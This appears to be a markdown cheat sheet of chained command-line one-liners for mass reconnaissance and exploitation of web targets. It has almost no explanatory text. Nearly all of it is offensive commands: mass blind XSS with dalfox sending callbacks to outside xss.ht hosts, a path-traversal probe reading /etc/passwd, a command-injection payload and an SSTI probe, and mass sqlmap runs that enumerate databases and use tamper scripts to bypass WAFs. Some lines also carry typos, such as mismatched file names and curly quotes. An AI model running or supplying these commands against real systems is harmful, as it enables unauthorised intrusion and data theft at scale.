# Automation Command

```bash
amass intel -cidr 127.0.0.1/21 | subfinder -silent -all -o subdo.txt | rustscan -a subdo.txt -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates
```

```bash
cat target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht
```

```bash
rustscan -a 'hosts.txt' -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/
```

```bash
httpx -l urls.txt -pa -o url_ips.txt

cat urls_ips.txt | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' > ips.txt

httpx -l ips.txt -ports - -o ips_ports.txt

nuclei -l ips_ports.txt -t nuclei-templates/
```

```bash
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```

 ```bash
xargs -a cidr.txt -I@ bash -c 'amass intel -active -cidr @' | subfinder -all -silent | gauplus -subs | gf xss | uro | dalfox pipe --deep-domxss --multicast --blind dotdot.xss.ht
 ```
 
```bash
amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt

cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
```

```bash
amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
```

```bash
cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt

ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
// search for ”uid” in burp proxy intercept 
// You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
```

```bash
// **MASS SQL injection**
amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt

cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt

sqlmap -m domain2.txt -dbs --batch --random-agent

// **SQL Injection headers**
sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10

// **SQL Injection bypass 401**
sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401

// PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper
--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase
```
